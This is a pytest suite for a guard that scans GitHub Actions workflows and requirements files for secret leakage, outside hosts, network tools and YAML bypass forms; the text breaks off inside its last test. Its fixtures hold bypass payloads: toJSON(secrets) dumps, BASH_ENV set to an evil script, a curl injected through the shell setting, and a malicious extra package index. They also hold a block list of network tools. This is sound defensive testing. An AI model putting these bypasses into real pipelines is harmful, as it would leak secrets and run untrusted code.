"""GitHub Actions trigger guard (pure parsing, no network, no secret)."""
import importlib.util
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
TOOL = ROOT / 'tools' / 'workflow_trigger_guard.py'
WORKFLOWS = ROOT / '.github' / 'workflows'


def _load_tool():
    spec = importlib.util.spec_from_file_location('workflow_trigger_guard', TOOL)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


guard = _load_tool()

PROVIDER_PR = """name: Helius probe
on:
  pull_request:
    paths:
      - "bot/live/helius_probe.py"
  workflow_dispatch:
jobs:
  probe:
    runs-on: ubuntu-latest
    env:
      HELIUS_API_KEY: ${{ secrets.HELIUS_API_KEY }}
    steps:
      - run: python -m bot.live.helius_probe
"""

MANUAL_ONLY = """name: Helius probe (manual)
# Manual only; uses secrets.HELIUS_API_KEY when an owner dispatches it.
on:
  workflow_dispatch:
jobs:
  probe:
    runs-on: ubuntu-latest
    env:
      HELIUS_API_KEY: ${{ secrets.HELIUS_API_KEY }}
    steps:
      - run: python -m bot.live.helius_probe
"""

OFFLINE_CI = """name: Offline test suite
on:
  pull_request:
    paths:
      - "bot/**"
  workflow_dispatch:
permissions:
  contents: read
jobs:
  offline-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        with:
          persist-credentials: false
      - run: python -B tools/offline_check.py -q tests --ignore=tests/tests -p no:cacheprovider -rfE -W error
"""


@pytest.mark.parametrize('text, expected', [
    (PROVIDER_PR, ['pull_request', 'workflow_dispatch']),
    (MANUAL_ONLY, ['workflow_dispatch']),
    ('on: workflow_dispatch\njobs: {}\n', ['workflow_dispatch']),
    ('on: [push, "pull_request"]  # flow sequence\njobs: {}\n', ['push', 'pull_request']),
    ("on: {pull_request: {paths: ['a', 'b']}, workflow_dispatch: {}}\njobs: {}\n",
     ['pull_request', 'workflow_dispatch']),
    ('"on":\n  - push\n  - pull_request\njobs: {}\n', ['push', 'pull_request']),
    ("'on':\n- schedule\njobs: {}\n", ['schedule']),
    ('name: x\n\non:   # triggers\n  # a comment line\n\n  pull_request_target:\n'
     '    types: [labeled]\n  workflow_dispatch: {}\njobs: {}\n',
     ['pull_request_target', 'workflow_dispatch']),
    ('on:\r\n  pull_request:\r\n    types: [labeled]\r\njobs: {}\r\n', ['pull_request']),
])
def test_parse_triggers_reads_every_yaml_form(text, expected):
    assert guard.parse_triggers(text) == expected


@pytest.mark.parametrize('text, reason', [
    ('name: x\njobs:\n  a:\n    with:\n      on: push\n', 'no top-level on'),
    ('on: push\non: pull_request\n', 'several top-level on'),
    ('on: [push, pull_request\n  ]\n', 'flow sequence must end'),
    ('on:\n  push:\n  push:\n', 'duplicate event'),
    ('on:\n  schedule: "0 * * * *"\n', 'unexpected scalar value'),
    ('on:\njobs: {}\n', 'has no event'),
    ('on: ${{ evil }}\n', 'unexpected event name'),
])
def test_unreadable_triggers_fail_closed(text, reason):
    with pytest.raises(guard.TriggerParseError, match=reason):
        guard.parse_triggers(text)
    assert guard.check_workflow('anything.yml', text)[0].startswith('unparseable_on:')


def test_provider_workflow_with_pull_request_is_refused():
    assert guard.check_workflow('helius-probe.yml', PROVIDER_PR) == ['automatic_trigger:pull_request']


def test_manual_only_provider_workflow_is_accepted_even_with_secrets():
    assert guard.check_workflow('helius-probe.yml', MANUAL_ONLY) == []


@pytest.mark.parametrize('trigger', [
    'pull_request:\n    types: [labeled]',
    'pull_request_target:',
    'push:\n    branches: ["review/*"]',
    'schedule:\n    - cron: "43 */6 * * *"',
    'workflow_run:\n    workflows: ["x"]',
    'issue_comment:',
])
def test_any_automatic_event_is_refused_outside_the_ci_allowlist(trigger):
    text = 'on:\n  %s\n  workflow_dispatch:\njobs: {}\n' % trigger
    event = trigger.split(':', 1)[0]
    assert guard.check_workflow('trawl-no-payment-quotes.yml', text) == ['automatic_trigger:%s' % event]


def test_allowlisted_ci_is_accepted_and_cannot_widen_its_events():
    assert guard.check_workflow('offline-tests.yml', OFFLINE_CI) == []
    widened = OFFLINE_CI.replace('  workflow_dispatch:\n', '  workflow_dispatch:\n  pull_request_target:\n')
    assert guard.check_workflow('offline-tests.yml', widened) == ['automatic_trigger:pull_request_target']
    scheduled = OFFLINE_CI.replace('  workflow_dispatch:\n', '  workflow_dispatch:\n  schedule:\n    - cron: "0 0 * * *"\n')
    assert guard.check_workflow('offline-tests.yml', scheduled) == ['automatic_trigger:schedule']


@pytest.mark.parametrize('snippet, violation', [
    ('    env:\n      KEY: ${{ secrets.HELIUS_API_KEY }}\n', 'secret_in_automatic_workflow:HELIUS_API_KEY'),
    ('    env:\n      KEY: ${{ Secrets . Helius_Api_Key }}\n', 'secret_in_automatic_workflow:Helius_Api_Key'),
    ("    env:\n      KEY: ${{ secrets['BITQUERY_TOKEN'] }}\n", 'secret_in_automatic_workflow:secrets_context'),
    # Bypasses reported by RUGGER 02 (T-0018, point 2).
    ('    env:\n      ALL: ${{ toJSON(secrets) }}\n', 'secret_in_automatic_workflow:secrets_context'),
    ("    env:\n      KEY: ${{ secrets[format('{0}_{1}', 'HELIUS', 'API_KEY')] }}\n",
     'secret_in_automatic_workflow:secrets_context'),
    ('    env:\n      KEY: ${{ secrets.GITHUB_TOKEN_EXTRA }}\n', 'secret_in_automatic_workflow:GITHUB_TOKEN_EXTRA'),
    ("    if: secrets.HELIUS_API_KEY != ''\n", 'secret_in_automatic_workflow:HELIUS_API_KEY'),
    ('    if: >-\n      github.event_name == \'push\' &&\n      contains(toJSON(secrets), \'HELIUS\')\n',
     'secret_in_automatic_workflow:secrets_context'),
    ('    env:\n      KEY: ${{ secrets.HELIUS_API_KEY\n', 'secret_in_automatic_workflow:unclosed_expression'),
    ('    secrets: inherit\n', 'secret_in_automatic_workflow:secrets_key'),
    ('    secrets:\n      key: ${{ secrets.GITHUB_TOKEN }}\n', 'secret_in_automatic_workflow:secrets_key'),
    ('    env:\n      WS: wss://mainnet.helius-rpc.com/?api-key=x\n',
     'external_host_in_automatic_workflow:mainnet.helius-rpc.com'),
    ('    env:\n      GIT: ssh://git@example.org:22/repo\n', 'external_host_in_automatic_workflow:example.org'),
    ('    env:\n      RPC: user:pw@api.mainnet-beta.solana.com\n',
     'external_host_in_automatic_workflow:api.mainnet-beta.solana.com'),
    ('    env:\n      QUOTE: trawl.run\n', 'external_host_in_automatic_workflow:trawl.run'),
    ('    env:\n      V6: http://[::1]:8501/\n', 'external_host_in_automatic_workflow:[::1]'),
    ('    env:\n      RPC_URL: https://api.mainnet-beta.solana.com\n',
     'external_host_in_automatic_workflow:api.mainnet-beta.solana.com'),
    ('    env:\n      QUOTE_URL: https://trawl.run/api/quote\n', 'external_host_in_automatic_workflow:trawl.run'),
])
def test_automatic_ci_may_not_use_secrets_or_external_hosts(snippet, violation):
    text = OFFLINE_CI.replace('    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n' + snippet, 1)
    violations = guard.check_workflow('offline-tests.yml', text)
    assert violation in violations
    # Only the env key allowlist and, for malformed values, the fail-closed syntax rules may add to it.
    extra = ('forbidden_env_in_automatic_workflow:', 'flow_mapping_in_automatic_workflow:',
             'flow_sequence_in_automatic_workflow:')
    assert [v for v in violations if not v.startswith(extra)] == [violation]


@pytest.mark.parametrize('uses, violation', [
    ('some-org/fetch-quotes@3d3c42e5aac5ba805825da76410c181273ba90b1',
     'action_not_allowed:some-org/fetch-quotes@3d3c42e5aac5ba805825da76410c181273ba90b1'),
    ('actions/checkout@v4', 'action_not_pinned:actions/checkout@v4'),
    ('./.github/actions/probe', 'action_not_allowed:./.github/actions/probe'),
    ('docker://alpine:3.20', 'external_host_in_automatic_workflow:alpine:3.20'),  # also a registry pull
    ('"actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea"',
     'action_not_allowed:actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea'),
])
def test_automatic_ci_runs_only_allowlisted_pinned_actions(uses, violation):
    text = OFFLINE_CI.replace('      - run: python', '      - uses: %s\n      - run: python' % uses, 1)
    violations = guard.check_workflow('offline-tests.yml', text)
    assert violation in violations
    assert [v for v in violations if v.startswith('action_')] == [
        'action_%s:%s' % ('not_pinned' if '@v4' in uses else 'not_allowed', uses.strip('"'))]


def test_reusable_workflow_call_in_automatic_ci_is_refused():
    text = OFFLINE_CI + '  probe:\n    uses: some-org/repo/.github/workflows/probe.yml@main\n'
    assert guard.check_workflow('offline-tests.yml', text) == [
        'action_not_allowed:some-org/repo/.github/workflows/probe.yml@main']


def test_words_and_file_names_are_not_mistaken_for_secrets_or_hosts():
    text = OFFLINE_CI.replace('name: Offline test suite', 'name: Offline test suite (no network, no secrets)', 1)
    text = text.replace('      - run: python -B tools/offline_check.py -q tests --ignore=tests/tests -p no:cacheprovider -rfE -W error\n',
                        '      - name: Run without secrets\n'
                        '        run: |\n'
                        '          bash start.sh && python -m bot.live.helius_probe --help\n'
                        '          sha256sum requirements-live.txt bot/live/unsigned_preflight.py\n'
                        '          echo "contact: noreply@github.com"\n', 1)
    violations = guard.check_workflow('offline-tests.yml', text)
    # Only the (deliberately) unreviewed step is reported: no secret, host or network false positive.
    assert len(violations) == 1 and violations[0].startswith('unapproved_run_step:')


def test_github_token_github_or_loopback_urls_and_commented_secrets_are_allowed_in_ci():
    text = OFFLINE_CI.replace(
        '    runs-on: ubuntu-latest\n',
        '    runs-on: ubuntu-latest\n'
        '    # never add secrets.HELIUS_API_KEY or https://mainnet.helius-rpc.com here\n'
        '    env:\n      PYTHONUTF8: ${{ secrets.GITHUB_TOKEN }}\n'
        '      RUGGER_NO_DOTENV: https://github.com/actions/checkout\n'
        '      PYTHONDONTWRITEBYTECODE: http://127.0.0.1:8501/healthz\n', 1)
    assert guard.check_workflow('offline-tests.yml', text) == []


def test_scan_directory_and_cli_exit_codes(tmp_path, capsys):
    (tmp_path / 'offline-tests.yml').write_text(OFFLINE_CI, encoding='utf-8')
    (tmp_path / 'helius-manual.yml').write_text(MANUAL_ONLY, encoding='utf-8')
    (tmp_path / 'notes.txt').write_text('on: push\n', encoding='utf-8')
    assert guard.main([str(tmp_path)]) == 0
    assert 'workflows=2 automatic=offline-tests.yml manual_only=1 requirements=0 violations=0' in capsys.readouterr().out
    (tmp_path / 'helius-probe.yaml').write_text(PROVIDER_PR, encoding='utf-8')
    assert guard.main([str(tmp_path)]) == 1
    assert 'VIOLATION helius-probe.yaml: automatic_trigger:pull_request' in capsys.readouterr().out
    assert guard.main([str(tmp_path / 'missing')]) == 2


def test_repository_workflows_respect_the_trigger_invariant():
    """Regression lock for D3: every network/provider workflow stays manual-only."""
    assert WORKFLOWS.is_dir(), 'workflow files must be copied into the offline harness'
    report = guard.scan_directory(WORKFLOWS)
    assert len(report) >= 3
    violations = {name: entry['violations'] for name, entry in report.items() if entry['violations']}
    assert violations == {}
    automatic = {name for name, entry in report.items() if set(entry['events']) - guard.MANUAL_EVENTS}
    assert automatic <= set(guard.AUTOMATIC_WORKFLOWS)


def _with_step(command_block):
    """OFFLINE_CI plus one extra run: step (block scalar)."""
    step = '      - name: extra\n        run: |\n' + ''.join('          %s\n' % line for line in command_block.splitlines())
    return OFFLINE_CI + step


def _step_hash(command_block):
    return guard.run_step_hash(guard.normalize_run_step(command_block.splitlines()))[:16]


@pytest.mark.parametrize('command, tool', [
    ('curl -s https://trawl.run/api/quote', 'curl'),
    ('wget -q -O- https://mainnet.helius-rpc.com', 'wget'),
    ('Invoke-WebRequest -Uri $env:RPC_URL', 'invoke-webrequest'),
    ('curl --fail "$QUOTE_ENDPOINT"', 'curl'),
    ('gh api repos/x/y', 'gh'),
    ('npx some-probe', 'npx'),
    ('docker run alpine', 'docker'),
    ('ssh deploy@host true', 'ssh'),
    ('git -c http.extraHeader=x fetch origin', 'git fetch'),
    ('git clone https://github.com/x/y', 'git clone'),
])
def test_network_tools_in_automatic_ci_are_refused(command, tool):
    violations = guard.check_workflow('offline-tests.yml', _with_step(command))
    assert 'network_command_in_automatic_workflow:%s' % tool in violations
    assert 'unapproved_run_step:%s' % _step_hash(command) in violations


def test_loopback_only_network_tool_is_not_a_network_command():
    command = 'curl --fail --silent http://127.0.0.1:8501/_stcore/health'
    violations = guard.check_workflow('offline-tests.yml', _with_step(command))
    assert violations == ['unapproved_run_step:%s' % _step_hash(command)]


@pytest.mark.parametrize('command, option', [
    ('python -m pip install --index-url https://pypi.org/simple x', '--index-url'),
    ('pip install --extra-index-url https://pypi.org/simple x', '--extra-index-url'),
    ('python -m pip install -i https://pypi.org/simple x', '-i'),
    ('pip3 install --find-links ./wheels x', '--find-links'),
    ('python -m pip install git+https://github.com/x/y', 'git+'),
    ('pip download --trusted-host pypi.org x', '--trusted-host'),
])
def test_pip_sources_other_than_pypi_are_refused(command, option):
    violations = guard.check_workflow('offline-tests.yml', _with_step(command))
    assert 'pip_source_in_automatic_workflow:%s' % option in violations


def test_run_steps_are_parsed_inline_or_block_and_hashed_identically():
    inline = 'jobs:\n  a:\n    steps:\n      - run: python --version\n'
    block = 'jobs:\n  a:\n    steps:\n      - name: v\n        run: |\n          python --version\n\n      - name: w\n'
    assert guard.run_steps(inline) == guard.run_steps(block) == ['python --version']
    folded = 'jobs:\n  a:\n    steps:\n      - run: >-\n          echo a\n          echo b\n        env: {}\n'
    assert guard.run_steps(folded) == ['echo a\necho b']


def test_changed_approved_step_is_refused_until_reviewed():
    changed = OFFLINE_CI.replace('-rfE -W error', '-rfE -W error && python -m bot.live.helius_probe', 1)
    violations = guard.check_workflow('offline-tests.yml', changed)
    assert len(violations) == 1 and violations[0].startswith('unapproved_run_step:')
    assert guard.check_workflow('offline-tests.yml', OFFLINE_CI) == []


def test_every_approved_step_exists_in_its_workflow():
    """No stale approval: each approved hash matches a step of the real file."""
    for name, approved in guard.APPROVED_RUN_STEPS.items():
        path = WORKFLOWS / name
        assert path.is_file(), name
        hashes = {guard.run_step_hash(step) for step in guard.run_steps(path.read_text(encoding='utf-8'))}
        assert set(approved) == hashes, name


@pytest.mark.parametrize('old, new, violation', [
    ('    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    env:\n      PIP_INDEX_URL: ${{ vars.MIRROR }}\n',
     'vars_context_in_automatic_workflow'),
    ('    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    env:\n      PIP_INDEX_URL: ${{ vars.MIRROR }}\n',
     'forbidden_env_in_automatic_workflow:PIP_INDEX_URL'),
    ('    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    env:\n      https_proxy: http://127.0.0.1:3128\n',
     'forbidden_env_in_automatic_workflow:HTTPS_PROXY'),
    ('    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    env:\n      PYTHONPATH: tools/shadow\n',
     'forbidden_env_in_automatic_workflow:PYTHONPATH'),
    ('      - run: python', '      - shell: bash -c "curl -s https://trawl.run; {0}"\n        run: python',
     'shell_not_allowed:bash -c "curl -s https://trawl.run; {0}"'),
    ('      - run: python', '      - working-directory: other\n        run: python',
     'forbidden_key_in_automatic_workflow:working-directory'),
    ('    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    container: alpine\n',
     'forbidden_key_in_automatic_workflow:container'),
    ('    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    services:\n      cache: {image: redis}\n',
     'forbidden_key_in_automatic_workflow:services'),
    ('    runs-on: ubuntu-latest\n', '    runs-on: [self-hosted, linux]\n', 'self_hosted_runner_in_automatic_workflow'),
    ('          persist-credentials: false\n', '          persist-credentials: false\n          repository: some-org/other\n',
     'forbidden_key_in_automatic_workflow:repository'),
    ('          persist-credentials: false\n', '          persist-credentials: false\n          ref: old-branch\n',
     'forbidden_key_in_automatic_workflow:ref'),
    ('          persist-credentials: false\n', '          persist-credentials: true\n',
     'checkout_without_persist_credentials_false'),
    ('permissions:\n  contents: read\n', 'permissions:\n  contents: write\n', 'write_permission_in_automatic_workflow:write'),
    ('permissions:\n  contents: read\n', 'permissions: write-all\n', 'write_permission_in_automatic_workflow:write-all'),
    ('permissions:\n  contents: read\n', '', 'missing_top_level_permissions'),
])
def test_approved_steps_cannot_be_altered_from_outside(old, new, violation):
    assert OFFLINE_CI.count(old) == 1
    violations = guard.check_workflow('offline-tests.yml', OFFLINE_CI.replace(old, new, 1))
    assert violation in violations, violations


def test_allowed_shells_and_comments_are_accepted():
    text = OFFLINE_CI.replace('      - run: python', '      - shell: bash  # default\n        run: python', 1)
    assert guard.check_workflow('offline-tests.yml', text) == []
    text = OFFLINE_CI.replace('      - run: python', "      - shell: 'pwsh'\n        run: python", 1)
    assert guard.check_workflow('offline-tests.yml', text) == []


# Residual bypasses reported by RUGGER 02 (T-0020, point 2) and related YAML forms.
@pytest.mark.parametrize('old, new, violation', [
    ('      - run: python', '      - {run: python -m bot.live.public_sol_forward_paper}\n      - run: python',
     'flow_mapping_in_automatic_workflow:'),
    ('      - run: python', '      - {uses: someone/net-action@v1}\n      - run: python', 'flow_mapping_in_automatic_workflow:'),
    ('      - run: python', '      - "run": python -m bot.live.public_sol_forward_paper\n      - run: python',
     'quoted_key_in_automatic_workflow:"run"'),
    ('      - run: python', "      - 'uses': someone/net-action@v1\n      - run: python",
     "quoted_key_in_automatic_workflow:'uses'"),
    ('    steps:\n', '    env:\n      "BASH_ENV": tools/evil.sh\n    steps:\n', 'quoted_key_in_automatic_workflow:"BASH_ENV"'),
    ('    steps:\n', '    env:\n      BASH_ENV: tools/evil.sh\n    steps:\n', 'forbidden_env_in_automatic_workflow:BASH_ENV'),
    ('    steps:\n', '    env:\n      ENV: tools/evil.sh\n    steps:\n', 'forbidden_env_in_automatic_workflow:ENV'),
    ('    steps:\n', '    env:\n      PYTEST_ADDOPTS: -p evil_plugin\n    steps:\n',
     'forbidden_env_in_automatic_workflow:PYTEST_ADDOPTS'),
    ('    steps:\n', '    env:\n      PYTEST_PLUGINS: evil_plugin\n    steps:\n',
     'forbidden_env_in_automatic_workflow:PYTEST_PLUGINS'),
    ('    steps:\n', '    env: ${{ fromJSON(github.event.pull_request.body) }}\n    steps:\n', 'env_not_block_mapping:'),
    ('        with:\n          persist-credentials: false\n',
     '        with:\n          persist-credentials: false\n          fetch-tags: true\n',
     'forbidden_with_input_in_automatic_workflow:fetch-tags'),
    ('    steps:\n', '    steps: [run: curl -s https://trawl.run]\n    other:\n', 'flow_sequence_in_automatic_workflow:'),
    ('      - run: python', '      - &probe\n        name: probe\n      - run: python', 'yaml_anchor_or_tag_in_automatic_workflow:'),
    ('      - run: python', '      - *probe\n      - run: python', 'yaml_anchor_or_tag_in_automatic_workflow:'),
    ('      - run: python', '      - <<: *defaults\n        name: x\n      - run: python', 'yaml_anchor_or_tag_in_automatic_workflow:'),
    ('      - run: python', '      - name: tagged\n        if: !contains(github.ref, x)\n      - run: python',
     'yaml_anchor_or_tag_in_automatic_workflow:'),
    ('jobs:\n', '---\njobs:\n', 'multiple_documents_in_automatic_workflow'),
    ('      - run: python', '      - name: complex\n        ? run\n        : curl -s https://trawl.run\n      - run: python',
     'complex_key_in_automatic_workflow:'),
    ('    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    environment: production\n',
     'forbidden_key_in_automatic_workflow:environment'),
    ('    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: bash\n',
     'forbidden_key_in_automatic_workflow:defaults'),
])
def test_yaml_forms_the_guard_cannot_read_exactly_are_refused(old, new, violation):
    assert OFFLINE_CI.count(old) == 1
    violations = guard.check_workflow('offline-tests.yml', OFFLINE_CI.replace(old, new, 1))
    assert any(v.startswith(violation) for v in violations), violations


@pytest.mark.parametrize('indicator', ['>', '>-', '|-', '|+', '|2'])
def test_only_literal_run_blocks_are_accepted(indicator):
    block = OFFLINE_CI.replace(
        '      - run: python -B tools/offline_check.py -q tests --ignore=tests/tests -p no:cacheprovider -rfE -W error\n',
        '      - run: %s\n          python -B tools/offline_check.py -q tests --ignore=tests/tests -p no:cacheprovider -rfE -W error\n'
        % indicator, 1)
    violations = guard.check_workflow('offline-tests.yml', block)
    assert 'run_block_not_literal:%s' % indicator in violations
    literal = block.replace('run: %s\n' % indicator, 'run: |\n', 1)
    assert guard.check_workflow('offline-tests.yml', literal) == []


def test_scalar_flow_lists_and_expressions_stay_accepted():
    text = OFFLINE_CI.replace('    runs-on: ubuntu-latest\n',
                              '    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n'
                              '        python-version: ["3.12", \'3.13\']\n', 1)
    text = text.replace('      - run: python', "      - if: ${{ !cancelled() && github.event_name != 'push' }}\n"
                                              "        run: python", 1)
    assert guard.check_workflow('offline-tests.yml', text) == []


@pytest.mark.parametrize('line, violation', [
    ('--index-url https://example.org/simple', 'pip_option_in_requirements:--index-url'),
    ('--extra-index-url https://pypi.org/simple', 'pip_option_in_requirements:--extra-index-url'),
    ('-i https://example.org/simple', 'pip_option_in_requirements:-i'),
    ('-f ./wheels', 'pip_option_in_requirements:-f'),
    ('--find-links=https://example.org/wheels', 'pip_option_in_requirements:--find-links=https://example.org/wheels'),
    ('-e .', 'pip_option_in_requirements:-e'),
    ('--trusted-host example.org', 'pip_option_in_requirements:--trusted-host'),
    ('-r https://example.org/req.txt', 'pip_include_not_root_requirements:https://example.org/req.txt'),
    ('git+https://github.com/x/y', 'url_in_requirements:'),
    ('probe @ https://example.org/probe-1.0-py3-none-any.whl', 'url_in_requirements:'),
    ('probe@file:///tmp/probe.whl', 'url_in_requirements:'),
    ('aiohttp>=3.10 --global-option=x', 'pip_option_in_requirements:--global-option'),
    # Residual path reported by RUGGER 02 (T-0021, point 2): includes and local paths.
    ('-r vendor/extra.txt', 'pip_include_not_root_requirements:vendor/extra.txt'),
    ('-c ../constraints.txt', 'pip_include_not_root_requirements:../constraints.txt'),
    ('--requirement=extra.txt', 'pip_include_not_root_requirements:extra.txt'),
    ('./vendor/pkg', 'not_a_pypi_requirement:'),
    ('vendor/pkg', 'not_a_pypi_requirement:'),
    ('.', 'not_a_pypi_requirement:'),
    ('probe-1.0-py3-none-any.whl', 'not_a_pypi_requirement:'),
    ('probe.tar.gz', 'not_a_pypi_requirement:'),
    ('probe-1.0.zip', 'not_a_pypi_requirement:'),
    ('probe-1.0.tar.xz', 'not_a_pypi_requirement:'),
    ('~/pkg', 'not_a_pypi_requirement:'),
])
def test_requirements_may_only_name_pypi_packages(line, violation):
    violations = guard.requirements_violations('# header\naiohttp>=3.10,<4\n%s\n' % line)
    assert any(v.startswith(violation) for v in violations), violations


def test_plain_requirements_includes_hashes_and_markers_are_accepted():
    text = ('# comment\n-r requirements.txt\n-c requirements-constraints.txt\nstreamlit>=1.39,<2\n'
            'pandas==2.3.3 --hash=sha256:%s\n' % ('a' * 64) +
            'numpy==2.3.4; python_version >= "3.11"  # pinned\ncryptography[ssh]>=46,<47\n')
    assert guard.requirements_violations(text) == []


def test_repository_requirements_only_name_pypi_packages():
    files = guard.scan_requirements(ROOT)
    assert files, 'requirements*.txt must be copied into the offline harness'
    assert {name: v for name, v in files.items() if v} == {}


# Mutations applied to the real workflow files: every bypass reported by RUGGER 02
# (T-0018, point 2) and the other forbidden changes must be detected.
REAL_MUTATIONS = [
    ('helius-signed-master-paper.yml', 'on:\n', 'on:\n  pull_request:\n',
     'automatic_trigger:pull_request'),
    ('offline-tests.yml', '      PYTHONUTF8: "1"\n', '      PYTHONUTF8: "1"\n      ALL: ${{ toJSON(secrets) }}\n',
     'secret_in_automatic_workflow:secrets_context'),
    ('offline-tests.yml', '      PYTHONUTF8: "1"\n',
     "      PYTHONUTF8: \"1\"\n      K: ${{ secrets[format('{0}', 'HELIUS_API_KEY')] }}\n",
     'secret_in_automatic_workflow:secrets_context'),
    ('offline-tests.yml', '      PYTHONUTF8: "1"\n', '      PYTHONUTF8: "1"\n      WS: wss://mainnet.helius-rpc.com\n',
     'external_host_in_automatic_workflow:mainnet.helius-rpc.com'),
    ('offline-tests.yml', '      PYTHONUTF8: "1"\n', '      PYTHONUTF8: "1"\n      Q: trawl.run\n',
     'external_host_in_automatic_workflow:trawl.run'),
    ('rugger-isolated-ci.yml', '      - name: Install Python\n',
     '      - uses: some-org/net-action@3d3c42e5aac5ba805825da76410c181273ba90b1\n      - name: Install Python\n',
     'action_not_allowed:some-org/net-action@3d3c42e5aac5ba805825da76410c181273ba90b1'),
    ('rugger-isolated-ci.yml', '      - name: Install Python\n',
     '      - uses: actions/checkout@v4\n      - name: Install Python\n', 'action_not_pinned:actions/checkout@v4'),
    ('rugger-isolated-ci.yml', "          set -euo pipefail\n          git rev-parse HEAD\n",
     "          set -euo pipefail\n          curl -s https://trawl.run/api/quote\n          git rev-parse HEAD\n",
     'network_command_in_automatic_workflow:curl'),
    ('offline-tests.yml', '-r requirements-live.txt -r requirements-dashboard.txt pytest',
     '--extra-index-url https://pypi.org/simple -r requirements-live.txt -r requirements-dashboard.txt pytest',
     'pip_source_in_automatic_workflow:--extra-index-url'),
    ('rugger-isolated-ci.yml', "        shell: bash\n        run: |\n          set -euo pipefail\n          python -B tools/offline_check.py",
     "        shell: bash -c 'curl -s https://trawl.run; source {0}'\n        run: |\n          set -euo pipefail\n          python -B tools/offline_check.py",
     'shell_not_allowed:'),
    ('offline-tests.yml', '      RUGGER_NO_DOTENV: "1"\n', '      RUGGER_NO_DOTENV: "1"\n      PIP_INDEX_URL: ${{ vars.MIRROR }}\n',
     'forbidden_env_in_automatic_workflow:PIP_INDEX_URL'),
    ('paper-terminal-ci.yml', '          persist-credentials: false\n      - name: Set up Windows',
     '          persist-credentials: false\n          repository: some-org/other\n      - name: Set up Windows',
     'forbidden_key_in_automatic_workflow:repository'),
    ('offline-tests.yml', 'permissions:\n  contents: read\n', 'permissions:\n  contents: write\n',
     'write_permission_in_automatic_workflow:write'),
    # T-0020 residual bypasses, on the real files.
    ('offline-tests.yml', '      - name: Python 3.12\n',
     '      - {run: python -m bot.live.public_sol_forward_paper}\n      - name: Python 3.12\n',
     'flow_mapping_in_automatic_workflow:'),
    ('offline-tests.yml', '      - name: Python 3.12\n',
     '      - "run": python -m bot.live.public_sol_forward_paper\n      - name: Python 3.12\n',
     'quoted_key_in_automatic_workflow:'),
    ('offline-tests.yml', '      PYTHONUTF8: "1"\n', '      PYTHONUTF8: "1"\n      BASH_ENV: tools/evil.sh\n',
     'forbidden_env_in_automatic_workflow:BASH_ENV'),
    ('rugger-isolated-ci.yml', '      PYTEST_DISABLE_PLUGIN_AUTOLOAD: \'1\'\n',
     '      PYTEST_DISABLE_PLUGIN_AUTOLOAD: \'1\'\n      PYTEST_ADDOPTS: -p evil_plugin\n',
     'forbidden_env_in_automatic_workflow:PYTEST_ADDOPTS'),
    ('rugger-isolated-ci.yml', "        shell: bash\n        run: |\n          set -euo pipefail\n          python -B tools/offline_check.py",
     "        shell: bash\n        run: >\n          set -euo pipefail\n          python -B tools/offline_check.py",
     'run_block_not_literal:>'),
    ('paper-terminal-ci.yml', '          python -m compileall -q bot/dashboard\n',
     '          python -m compileall -q bot/dashboard\n          python -m bot.live.helius_probe\n',
     'unapproved_run_step:'),
]


@pytest.mark.parametrize('name, old, new, expected', REAL_MUTATIONS)
def test_mutations_of_the_real_workflows_are_detected(tmp_path, name, old, new, expected):
    assert WORKFLOWS.is_dir(), 'workflow files must be copied into the offline harness'
    for path in WORKFLOWS.iterdir():
        if path.suffix in ('.yml', '.yaml'):
            (tmp_path / path.name).write_text(path.read_text(encoding='utf-8'), encoding='utf-8')
    target = tmp_path / name
    text = target.read_text(encoding='utf-8')
    assert text.count(old) == 1, 'mutation anchor moved in %s' % name
    assert guard.scan_directory(tmp_path)[name]['violations'] == []
    target.write_text(text.replace(old, new, 1), encoding='utf-8')
    violations = guard.scan_directory(tmp_path)[name]['violations']
    assert any(v.startswith(expected) for v in violations), violations
    assert guard.main([str(tmp_path)]) == 1


def test_offline_harness_refuses_external_connections():
    """Approved test steps run through tools/offline_check.py: prove its harness blocks the network."""
    import socket
    import sys
    if not Path(sys.argv[0]).name == 'p16h_isolated_runner.py':
        pytest.skip('only meaningful inside the offline harness (tools/offline_check.py)')
    with pytest.raises(AssertionError, match='external networking prohibited'):
        socket.getaddrinfo('mainnet.helius-rpc.com', 443)
    with pytest.raises(AssertionError, match='external networking prohibited'):
        socket.create_connection(('192.0.2.1', 443), timeout=0.01)


def test_requirements_mutation_is_detected_by_the_cli(tmp_path):
    workflows = tmp_path / '.github' / 'workflows'
    workflows.mkdir(parents=True)
    for path in WORKFLOWS.iterdir():
        if path.suffix in ('.yml', '.yaml'):
            (workflows / path.name).write_text(path.read_text(encoding='utf-8'), encoding='utf-8')
    for path in ROOT.glob('requirements*.txt'):
        (tmp_path / path.name).write_text(path.read_text(encoding='utf-8'), encoding='utf-8')
    assert guard.main([str(workflows)]) == 0
    target = tmp_path / 'requirements.txt'
    target.write_text(target.read_text(encoding='utf-8') + '--extra-index-url https://pypi.org.example/simple\n',
                      encoding='utf-8')
    assert guard.main([str(workflows)]) == 1


def test_requirements_include_outside_the_root_files_is_detected_by_the_cli(tmp_path):
    """RUGGER 02 end-to-end case (T-0021): a root file includes a non-root file holding another index."""
    workflows = tmp_path / '.github' / 'workflows'
    workflows.mkdir(parents=True)
    for path in WORKFLOWS.iterdir():
        if path.suffix in ('.yml', '.yaml'):
            (workflows / path.name).write_text(path.read_text(encoding='utf-8'), encoding='utf-8')
    for path in ROOT.glob('requirements*.txt'):
        (tmp_path / path.name).write_text(path.read_text(encoding='utf-8'), encoding='utf-8')
    (tmp_path / 'vendor').mkdir()
    (tmp_path / 'vendor' / 'extra.txt').write_text(
        '--extra-index-url https://evil.example/simple\nprobe==1.0\n', encoding='utf-8')
